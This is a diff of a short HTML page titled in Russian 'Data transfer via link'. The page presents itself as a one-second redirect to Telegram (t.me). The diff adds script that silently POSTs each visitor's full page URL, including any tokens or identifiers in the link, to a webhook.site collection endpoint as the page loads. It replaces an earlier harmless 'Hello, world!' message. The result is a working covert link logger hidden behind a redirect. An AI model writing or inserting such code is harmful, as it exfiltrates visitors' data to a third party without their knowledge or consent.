@@ -5,14 +5,10 @@
     <title>Передача данных по ссылке</title>
     <meta http-equiv="refresh" content="1; url=https://t.me">
     <script>
-        var message = "Hello, world!";
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://webhook.site/6549bb50-4278-4489-90c8-ae9bf896131e");
+        xhr.open("POST", "	https://webhook.site/6549bb50-4278-4489-90c8-ae9bf896131e");
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.onload = function() {
-          window.location.replace("https://t.me");
-        };
-        xhr.send("message=" + encodeURIComponent(message));
+        xhr.send("url=" + encodeURIComponent(window.location.href));
     </script>
 </head>
 <body>
